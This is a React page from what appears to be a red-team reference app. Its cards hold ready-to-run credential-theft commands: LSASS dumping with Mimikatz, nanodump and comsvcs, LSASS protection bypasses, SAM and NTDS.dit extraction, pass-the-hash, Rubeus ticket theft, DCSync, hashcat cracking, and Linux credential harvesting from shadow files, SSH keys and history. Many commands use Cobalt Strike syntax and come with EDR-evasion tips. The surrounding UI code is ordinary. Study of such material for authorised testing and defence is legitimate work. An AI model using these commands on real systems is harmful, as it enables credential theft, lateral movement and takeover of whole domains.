import React, { useState } from 'react';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import DraggableCardList from '../components/DraggableCardList';
import { usePageStorage } from '../hooks/usePageStorage';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'SECRETS',
    color: 'green',
    nodes: [
      { title: 'Linux Credential Files', subtitle: '/etc/shadow • SSH keys • history • env', id: 'linux-creds' },
    ]
  },
  {
    header: 'MEMORY DUMPS',
    color: 'orange',
    nodes: [
      { title: 'Mimikatz / LSASS', subtitle: 'sekurlsa • logonpasswords • dump', id: 'mimikatz' },
      { title: 'NTLM Hashes', subtitle: 'SAM • PTH • NTDS.dit', id: 'ntlm' },
    ]
  },
  {
    header: 'KERBEROS & AD',
    color: 'yellow',
    nodes: [
      { title: 'Kerberos Tickets', subtitle: 'Extract • PTT • asktgt', id: 'kerb-tickets' },
      { title: 'DCSync', subtitle: 'DS-Replication • domain controller', id: 'dcsync' },
    ]
  },
  {
    header: 'OFFLINE CRACKING',
    color: 'red',
    nodes: [
      { title: 'Password Cracking', subtitle: 'Wordlists • rules • masks', id: 'cracking' },
      { title: 'Domain Cached Creds', subtitle: 'DCC2 • offline cracking', id: 'dcc' },
    ]
  },
];

const techniques = [
  {
    id: 'mimikatz',
    title: 'Mimikatz & LSASS Credential Dumping',
    subtitle: 'Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS',
    tags: ['Mimikatz', 'LSASS', 'sekurlsa', 'logonpasswords', 'minidump', 'SafetyKatz'],
    accentColor: 'orange',
    overview: 'LSASS (Local Security Authority Subsystem Service) caches credentials for all logged-in users in memory — NTLM hashes, Kerberos tickets, and in some configurations plaintext WDigest passwords. Mimikatz\'s sekurlsa module reads this memory directly. Modern EDR solutions monitor LSASS access, making direct dumps detectable. Stealthier approaches use comsvcs.dll MiniDump or nanodump to write an LSASS minidump that is then parsed offline with Mimikatz — separating the dump from the credential extraction.',
    steps: [
      'LSASS (Local Security Authority Subsystem Service) stores credentials of all logged-in users in memory',
      'Must run as SYSTEM or with SeDebugPrivilege to access LSASS memory',
      'Direct Mimikatz: run sekurlsa::logonpasswords to extract all credentials in one shot',
      'Dump LSASS to disk first (minidump), then analyze offline to avoid EDR in-process detection',
      'SafetyKatz: .NET Mimikatz that creates a minidump and parses offline — avoids Mimikatz signatures',
      'Protected LSASS (PPL): use Backstab or a BYOVD technique to bypass PPL before dumping',
      'After obtaining hashes: pass-the-hash, pass-the-ticket, or crack offline',
    ],
    commands: [
      {
        title: 'Mimikatz credential extraction',
        code: `# Cobalt Strike — Mimikatz commands (via fork-and-run)
logonpasswords    # Shortcut for sekurlsa::logonpasswords
mimikatz sekurlsa::logonpasswords    # Full module
mimikatz sekurlsa::wdigest           # WDigest plaintext (Win7/old)
mimikatz sekurlsa::ekeys             # Kerberos encryption keys
mimikatz lsadump::sam                # SAM database hashes

# LSASS minidump (dump to disk, analyze offline)
mimikatz misc::memdump               # Dump LSASS to file
# Or via Task Manager (if available) / comsvcs.dll
shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Analyze offline
mimikatz sekurlsa::minidump lsass.dmp
mimikatz sekurlsa::logonpasswords

# SafetyKatz — .NET Mimikatz (less detected)
execute-assembly /path/to/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# nanodump — stealth LSASS dump (avoids common signatures)
execute-assembly /path/to/nanodump.exe --write C:\Temp\ndump.dmp
# Retrieve and analyze locally with Mimikatz`
      },
      {
        title: 'Protected LSASS bypass',
        code: `# Check if LSASS is Protected (PPL)
shell Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
# RunAsPPL = 1 means PPL is enabled — can't dump directly

# PPL bypass options:
# 1. Backstab — kills PPL via vulnerable driver
Backstab.exe -n lsass.exe -k    # Kill protection then dump

# 2. PPLdump — exploits known PPL bypass
execute-assembly /path/to/PPLdump.exe 664 C:\Temp\lsass.dmp   # PID 664 = lsass

# 3. Mimikatz PPL bypass (requires admin + vulnerable driver)
mimikatz !sekurlsa::logonpasswords   # The "!" prefix uses kernel driver

# nanodump with fork (creates a child of LSASS — bypasses some detection)
execute-assembly /path/to/nanodump.exe --fork --write C:\Temp\ndump.dmp`
      }
    ]
  },
  {
    id: 'ntlm',
    title: 'NTLM Hash Extraction & Usage',
    subtitle: 'Extract NTLM hashes from SAM and NTDS.dit for pass-the-hash and cracking',
    tags: ['NTLM', 'SAM', 'NTDS.dit', 'impacket', 'pass-the-hash', 'secretsdump'],
    accentColor: 'orange',
    overview: 'NTLM hashes are unsalted MD4 hashes of Windows account passwords. The local SAM database stores hashes for local accounts, accessible as SYSTEM via registry save or Volume Shadow Copy. NTDS.dit is the Active Directory database on domain controllers — it contains every domain account hash and can be extracted via VSS or DCSync. Crucially, NTLM hashes can be used directly for authentication (Pass-the-Hash) without needing to crack them first.',
    steps: [
      'SAM database: stores local account NTLM hashes — accessible as SYSTEM via reg save or shadow copy',
      'NTDS.dit: the AD database on domain controllers — contains all domain account NTLM hashes',
      'Dump SAM + SYSTEM hive offline and use impacket secretsdump to extract hashes',
      'For NTDS.dit: use secretsdump remotely (with DA creds) or copy via Volume Shadow Copy',
      'NTLM hashes: use for pass-the-hash (WMI, SMB, WinRM) without knowing the plaintext password',
      'Crack NTLM hashes offline with hashcat (very fast — NTLM has no salt)',
    ],
    commands: [
      {
        title: 'SAM and NTDS.dit extraction',
        code: `# SAM dump (local, requires SYSTEM)
# Via registry save
shell reg save HKLM\SAM C:\Temp\sam.hiv
shell reg save HKLM\SYSTEM C:\Temp\system.hiv
shell reg save HKLM\SECURITY C:\Temp\security.hiv

# Offline extraction with secretsdump
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
# Outputs: Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::

# NTDS.dit via VSS (Volume Shadow Copy)
shell vssadmin create shadow /for=C:
shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
impacket-secretsdump -ntds ntds.dit -system system.hiv LOCAL

# Remote NTDS dump via secretsdump (with DA creds)
impacket-secretsdump corp.local/Administrator:Password@DC01
impacket-secretsdump -hashes :NTLM_HASH corp.local/Administrator@DC01

# Mimikatz lsadump::lsa (from DC beacon as SYSTEM)
mimikatz lsadump::lsa /patch          # Dump all domain hashes from DC
mimikatz lsadump::sam                 # SAM hashes`
      },
      {
        title: 'Pass-the-Hash',
        code: `# Pass-the-Hash — use NTLM hash without cracking
# Cobalt Strike — make_token with hash
pth DOMAIN\Administrator <NTLM_HASH>
# Now beacon is operating as Administrator (hash passed to WinAPI)

# CS built-in PTH
shell net use \\DC01\C$ /user:CORP\Administrator
# Not needed with pth — just use UNC paths after pth

# Impacket tools with hash
impacket-wmiexec -hashes :NTLM_HASH CORP/Administrator@TARGET
impacket-smbexec -hashes :NTLM_HASH CORP/Administrator@TARGET
impacket-psexec -hashes :NTLM_HASH CORP/Administrator@TARGET

# Evil-WinRM with hash
evil-winrm -i TARGET -u Administrator -H NTLM_HASH

# Cracking NTLM with hashcat
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# NTLM: no salt — extremely fast (100GB/s on GPU)`
      }
    ]
  },
  {
    id: 'kerb-tickets',
    title: 'Kerberos Ticket Extraction & Pass-the-Ticket',
    subtitle: 'Extract TGTs and TGS tickets from memory and use them for authentication',
    tags: ['Rubeus', 'PTT', 'TGT', 'TGS', 'kirbi', 'overpass-the-hash'],
    accentColor: 'yellow',
    overview: 'Kerberos tickets (TGTs and TGS) are stored in LSASS memory and can be extracted and reused without knowing the account password. A TGT (Ticket Granting Ticket) is the most powerful — it can be used to request TGS tickets for any service the account has access to. Rubeus provides the most comprehensive Kerberos toolkit: dump, monitor (catch tickets as they arrive), harvest, and inject. Overpass-the-Hash converts an NTLM hash into a Kerberos TGT, enabling Kerberos-based authentication with a hash.',
    steps: [
      'Kerberos tickets stored in LSASS memory — extract TGTs and TGS tickets using Mimikatz or Rubeus',
      'Pass-the-Ticket: inject an extracted ticket into the current logon session for lateral movement',
      'Overpass-the-Hash: use an NTLM hash to request a TGT (get Kerberos from NTLM)',
      'Rubeus: modern Kerberos toolkit — monitor, harvest, dump, and inject tickets',
      'TGT extraction is more powerful than TGS — TGT can be used to request tickets for any service',
      'Import extracted tickets and use them for accessing services in the target environment',
    ],
    commands: [
      {
        title: 'Rubeus ticket operations',
        code: `# Dump all Kerberos tickets in memory
execute-assembly /path/to/Rubeus.exe dump                  # All tickets
execute-assembly /path/to/Rubeus.exe dump /service:krbtgt  # TGTs only
execute-assembly /path/to/Rubeus.exe dump /luid:0x3e4      # Specific logon session

# Monitor for new TGTs (catch admin logins)
execute-assembly /path/to/Rubeus.exe monitor /interval:5 /nowrap

# Harvest TGTs (continuous monitoring)
execute-assembly /path/to/Rubeus.exe harvest /interval:30

# Pass-the-Ticket — inject ticket into current session
execute-assembly /path/to/Rubeus.exe ptt /ticket:<BASE64_TICKET>
# Or from .kirbi file:
execute-assembly /path/to/Rubeus.exe ptt /ticket:ticket.kirbi

# Overpass-the-Hash — NTLM hash → TGT
execute-assembly /path/to/Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /domain:corp.local /ptt
# /ptt = pass-the-ticket immediately

# Mimikatz ticket operations
mimikatz sekurlsa::tickets /export              # Export all tickets to disk
mimikatz kerberos::list /export                 # Export from current session
mimikatz kerberos::ptt ticket.kirbi             # Import ticket
mimikatz kerberos::purge                        # Clear all tickets

# Verify injected ticket
klist    # List tickets in current session`
      }
    ]
  },
  {
    id: 'dcsync',
    title: 'DCSync — Domain Controller Sync Attack',
    subtitle: 'Abuse DS-Replication rights to pull password hashes from the domain controller',
    tags: ['DCSync', 'DS-Replication', 'Mimikatz', 'lsadump::dcsync', 'krbtgt'],
    accentColor: 'yellow',
    overview: 'DCSync mimics the behaviour of a domain controller requesting replication data from another DC. Using DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (held by Domain Admins by default), it pulls the NTLM hash of any domain account — including krbtgt — over the network without running any code on the DC. This is the primary method for extracting the krbtgt hash needed for Golden Ticket attacks and is far stealthier than dumping LSASS on the DC itself.',
    steps: [
      'DCSync abuses the MS-DRSR replication protocol — pretend to be a domain controller requesting replication data',
      'Requires: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (Domain Admins have these)',
      'No code runs on the DC — entirely network-based attack (no LSASS access needed)',
      'Can pull any domain account hash including krbtgt (needed for Golden Tickets)',
      'Much stealthier than dumping LSASS on the DC — generates replication events in DC logs',
      'Use to dump krbtgt, Administrator, and all service account hashes for persistence',
    ],
    commands: [
      {
        title: 'DCSync with Mimikatz',
        code: `# DCSync — pull specific account hash
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz lsadump::dcsync /domain:corp.local /user:CORP\svc-sql

# Dump ALL domain hashes
mimikatz lsadump::dcsync /domain:corp.local /all /csv
# Outputs: username:RID:LM_HASH:NT_HASH

# Via Cobalt Strike beacon (running as DA)
dcsync corp.local CORP\krbtgt
dcsync corp.local CORP\Administrator

# Remote DCSync via impacket (from Linux — with DA creds)
impacket-secretsdump -just-dc corp.local/Administrator:Password@DC01.corp.local
impacket-secretsdump -just-dc -hashes :NTLM_HASH corp.local/Administrator@DC01

# Check who has DCSync rights (PowerView)
Get-ObjectAcl -DistinguishedName "dc=corp,dc=local" -ResolveGUIDs | 
  Where-Object { ($_.ActiveDirectoryRights -match "GenericAll|ExtendedRight") -and ($_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-32") } |
  Select-Object SecurityIdentifier,ActiveDirectoryRights`
      }
    ]
  },
  {
    id: 'cracking',
    title: 'Password Cracking',
    subtitle: 'Crack NTLM, NTLMv2, Kerberos hashes with hashcat wordlists, rules, and masks',
    tags: ['hashcat', 'NTLM', 'NTLMv2', 'Kerberoast', 'rockyou', 'rules', 'masks'],
    accentColor: 'red',
    overview: 'Offline password cracking tests candidate passwords against captured hashes without interacting with the target. NTLM hashes (mode 1000) have no salt and are extremely fast — a modern GPU tests hundreds of billions of hashes per second against rockyou.txt. Rule-based attacks apply transformations to wordlist entries (append numbers, capitalise, leet substitution). Mask attacks target known password patterns (Company+Year+Symbol). Kerberoast hashes (mode 13100) and NTLMv2 (mode 5600) are slower due to the underlying hash algorithm complexity.',
    steps: [
      'NTLM hashes (mode 1000): no salt — fastest cracking. GPU can test billions/second',
      'Wordlist attack: start with rockyou.txt, then add target-specific words',
      'Rule-based attack: apply mangling rules (leetspeak, append numbers, capitalize) to wordlist',
      'Mask attack: when you know the password pattern (e.g., Company+Year+Symbol)',
      'Combinator attack: combine two wordlists — "company" + "2024" = "company2024"',
      'KerberoastingHash (mode 13100): offline cracking of Kerberos TGS tickets',
    ],
    commands: [
      {
        title: 'Hashcat cracking techniques',
        code: `# NTLM straight wordlist
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM + rules (best64, dive, Hob064)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Mask attack — Company+Year pattern
hashcat -m 1000 hashes.txt -a 3 "Corp?d?d?d?d!"     # Corp1234!
hashcat -m 1000 hashes.txt -a 3 "?u?l?l?l?d?d?d?d"  # Passes like "Pass2024"
hashcat -m 1000 hashes.txt -a 3 --increment --increment-min 8 "?a?a?a?a?a?a?a?a?a?a?a?a"

# Combinator — word1+word2
hashcat -m 1000 hashes.txt -a 1 words1.txt words2.txt

# Kerberoasting (TGS ticket)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# AS-REP Roasting
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv2 (captured from Responder)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# Show cracked passwords
hashcat -m 1000 hashes.txt --show`
      }
    ]
  },
  {
    id: 'dcc',
    title: 'Domain Cached Credentials (DCC2)',
    subtitle: 'Extract and crack domain credentials cached locally on workstations',
    tags: ['DCC2', 'cached credentials', 'MS-Cache2', 'hashcat mode 2100', 'offline'],
    accentColor: 'red',
    overview: 'Domain Cached Credentials (DCC2 / MS-Cache v2) are stored in the SECURITY registry hive to allow domain users to log in when the DC is unreachable. They use a PBKDF2-like derivation (10240 rounds of MD4) making them significantly slower to crack than NTLM — expect 1–10 MH/s vs 100 GH/s. Critically, DCC2 hashes cannot be used for Pass-the-Hash — they must be cracked to plaintext first. They are most valuable when a domain user\'s password can be recovered this way after the DC is no longer accessible.',
    steps: [
      'Windows caches the last 10 domain logons locally — allows logon when DC is unreachable',
      'Cached credentials are stored in SECURITY hive as DCC2 (MSCACHE2) hashes',
      'DCC2 uses PBKDF2-like derivation — very slow to crack (unlike NTLM)',
      'Requires SYSTEM access to read the SECURITY registry hive',
      'Extract with Mimikatz lsadump::cache or Secretsdump',
      'DCC2 hashes cannot be used for PTH — must crack to plaintext first',
    ],
    commands: [
      {
        title: 'DCC2 extraction and cracking',
        code: `# Dump cached credentials (requires SYSTEM)
mimikatz lsadump::cache
# Outputs: * Username : john.smith
#          * Domain   : CORP
#          * Password : (null)
#          * Hash     : $DCC2$10240#john.smith#<HASH>

# Via secretsdump (offline)
impacket-secretsdump -security security.hiv -system system.hiv LOCAL
# Outputs: $DCC2$10240#username#hash

# Hashcat DCC2 cracking (mode 2100 — slow!)
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# Note: DCC2 uses 10240 iterations of MD4/PBKDF2 — much slower than NTLM
# Expect: ~1-10 MH/s on GPU (vs 100GB/s for NTLM)

# Prioritize cracking shorter/simpler passwords first
hashcat -m 2100 dcc2_hashes.txt -a 3 "?u?l?l?l?l?d?d?d?d"  # Masks first
hashcat -m 2100 dcc2_hashes.txt words.txt -r best64.rule      # Then rules`
      }
    ]
  },
];

const linuxCreds = [
  {
    id: 'linux-creds',
    title: 'Linux Credential Access',
    subtitle: 'Extract credentials from Linux systems: shadow file, SSH keys, config files, bash history',
    tags: ['/etc/shadow', 'SSH private key', 'bash_history', '.env', 'keyring', 'credential files'],
    accentColor: 'green',
    overview: 'Linux systems store credentials across multiple locations — /etc/shadow (hashed passwords, root-readable only), SSH private keys (~/.ssh/), shell history files (commands often include passwords passed as arguments), environment files (.env, wp-config.php, database.yml), and the GNOME Keyring. LaZagne automates credential extraction from browsers, SSH configs, and application credential stores. Mimipenguin dumps credentials from memory of running processes (browsers, mail clients).',
    steps: [
      '/etc/shadow: contains hashed passwords — readable only by root; dump and crack with hashcat/john',
      'SSH private keys: check ~/.ssh/id_rsa and /root/.ssh — may be unencrypted or weakly passphrase-protected',
      'Bash history: users type passwords in commands — check .bash_history, .zsh_history, .history',
      'Environment files: .env, config.yml, database.yml, wp-config.php often contain plaintext credentials',
      'GNOME Keyring / libsecret: stores saved credentials — query via secret-tool if running as that user',
      'Memory: mimipenguin or LaZagne dump credentials from Linux process memory (browsers, mail clients)',
    ],
    commands: [
      {
        title: 'Linux credential extraction',
        code: `# Shadow file (requires root)
cat /etc/shadow
# Format: user:$6$salt$hash: — $6$ = SHA-512
# Crack with hashcat:
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
# or john:
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# SSH private keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
# Try to use directly:
ssh -i id_rsa user@TARGET
# Crack SSH key passphrase:
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash

# Bash history
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
# Search for passwords in history
grep -i "pass\|password\|secret\|token\|key" ~/.bash_history

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|token" 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
find / -name "database.yml" 2>/dev/null | xargs cat 2>/dev/null

# LaZagne — multi-platform credential dumper
python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py sshkeys

# mimipenguin — dump credentials from memory (root)
python3 mimipenguin.py
bash mimipenguin.sh

# GNOME Keyring credentials
secret-tool search --all username ""
dbus-send --print-reply --dest=org.gnome.keyring /org/gnome/keyring/daemon \
  org.gnome.keyring.Daemon.GetSocketPath`
      }
    ]
  },
];

const colorOptions = [
  { value: 'cyan', name: 'Cyan' },{ value: 'green', name: 'Green' },{ value: 'red', name: 'Red' },{ value: 'purple', name: 'Purple' },
  { value: 'orange', name: 'Orange' },{ value: 'pink', name: 'Pink' },{ value: 'blue', name: 'Blue' },{ value: 'yellow', name: 'Yellow' },
];
const colorPreview = { cyan:'bg-cyan-500', green:'bg-emerald-500', red:'bg-red-500', purple:'bg-purple-500', orange:'bg-orange-500', pink:'bg-pink-500', blue:'bg-blue-500', yellow:'bg-yellow-500' };
const headerColorMap = { cyan:'text-cyan-400 border-cyan-500/30', green:'text-emerald-400 border-emerald-500/30', red:'text-red-400 border-red-500/30', purple:'text-purple-400 border-purple-500/30', orange:'text-orange-400 border-orange-500/30', pink:'text-pink-400 border-pink-500/30', blue:'text-blue-400 border-blue-500/30', yellow:'text-yellow-400 border-yellow-500/30' };

export default function CredentialAccess() {
  const { columns, setColumns, allCards, addCustomCard, updateCard, deleteCard, reorderCards } = usePageStorage('credentialaccess', initialMapColumns, [...linuxCreds, ...techniques]);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [cardModalOpen, setCardModalOpen] = useState(false);
  const [editingCard, setEditingCard] = useState(null);
  const handleCardSubmit = (card) => { if (editingCard) { updateCard(card); setEditingCard(null); } else addCustomCard(card); };

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (i) => setColumns(columns.filter((_, idx) => idx !== i));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };

  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Credential </span><span className="text-orange-400">Access</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Mimikatz • NTLM PTH • Kerberos Tickets • DCSync • Password Cracking</p>
      </div>

      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
                  <button onClick={() => handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"><X className="w-3 h-3" /></button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode title={node.title} subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle} accentColor={color} onClick={() => scrollTo(node.id)} small />
                      </div>
                      <button onClick={() => handleDeleteTopic(i, j)} className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3" /></button>
                    </div>
                  ))}
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input type="text" value={topicTitle} onChange={e => setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => { if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <input type="text" value={topicTags} onChange={e => setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" onKeyDown={e => { if (e.key === 'Enter') handleAddTopic(i); if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <div className="flex gap-1">
                        <button onClick={() => handleAddTopic(i)} className="flex-1 px-2 py-1 bg-orange-600 hover:bg-orange-700 text-white text-xs font-mono rounded transition-colors">Add</button>
                        <button onClick={() => { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); }} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors">Cancel</button>
                      </div>
                    </div>
                  ) : (
                    <button onClick={() => setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors">+ Add Topic</button>
                  )}
                </div>
              </div>
            );
          })}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all">
              <Plus className="w-6 h-6 text-slate-500" /><span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input type="text" value={columnName} onChange={e => setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => e.key === 'Enter' && handleNameSubmit()} />
                <div className="flex gap-2">
                  <button onClick={() => setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Cancel</button>
                  <button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors font-mono text-sm font-semibold">Next</button>
                </div>
              </div>
            )}
            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map(option => (
                    <button key={option.value} onClick={() => setSelectedColor(option.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${selectedColor === option.value ? `${colorPreview[option.value]} text-slate-900` : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}>
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />{option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={() => setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Back</button>
                  <button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors font-mono text-sm font-semibold">Create</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between pt-4">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-orange-600 hover:bg-orange-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1">
          <Plus className="w-3 h-3" /> Add Technique
        </button>
      </div>
      <AddCardModal isOpen={cardModalOpen || !!editingCard} onClose={() => { setCardModalOpen(false); setEditingCard(null); }} onSubmit={handleCardSubmit} editCard={editingCard} />
      <div className="border-t border-slate-800/50 pt-10">
        <DraggableCardList cards={allCards} onDelete={deleteCard} onReorder={reorderCards} onEdit={(card) => setEditingCard(card)} />
      </div>
    </div>
  );
}